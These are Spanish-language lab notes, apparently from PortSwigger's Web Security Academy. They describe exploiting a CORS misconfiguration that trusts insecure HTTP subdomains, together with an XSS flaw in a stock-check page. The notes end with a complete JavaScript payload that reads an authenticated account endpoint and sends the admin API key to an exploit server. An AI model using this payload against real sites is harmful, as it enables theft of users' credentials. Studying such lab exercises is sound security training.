En esta clase abordamos un caso en el que el servidor permite solicitudes CORS desde cualquier subdominio, independientemente de si usan HTTPS o HTTP. Esta configuración es especialmente peligrosa cuando se combinan con peticiones que incluyen credenciales.

Aprovechamos una funcionalidad vulnerable de la aplicación, donde una URL en HTTP ejecuta un script inyectado a través de un parámetro. Este script lanza una solicitud **XMLHttpRequest** a un endpoint protegido, obteniendo la clave API del administrador gracias a que el origen inseguro en HTTP sigue siendo aceptado por el servidor. El resultado se redirige al servidor de explotación, permitiendo capturar y enviar la clave para completar el laboratorio.

Solucion
aplicamos los pasos pero en este caso no va funcionar ni el null ni otra cosa
![[Pasted image 20250728211958.png]]
entonces aqui trabaja con subdominios
la primera prueba sera con el propio dominio
![[Pasted image 20250728212301.png]]
probamos con otro diferente
![[Pasted image 20250728212435.png]]
y tambien funciona
ahora toca buscar en la web aver que encontramos
La web:
![[Pasted image 20250728212612.png]]
presionamos el del perro
![[Pasted image 20250728212639.png]]
le damos en check stock
cuando le damos en check stock obtenemos esto
![[Pasted image 20250728212726.png]]

vamos a intestigar esa nueva ventana injectando codigo
![[Pasted image 20250728212850.png]]
y es vulnerable a xss
y podemos ver que este subdomio no tiene problema en ser mandado al origin
![[Pasted image 20250728213015.png]]
asi que vamos a mandar exfiltrar informcion entonces para ello vamos a realizar un script

<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        location = "https://exploit-0a97004f0494e312811342b1019000de.exploit-server.net/?apikey=" + btoa(req.responseText);
    };
    req.open("GET","https://0a2e00b004e4e31e81c24391008f00ae.web-security-academy.net/accountDetails", true);
    req.withCredentials = true;
    req.send();
</script>
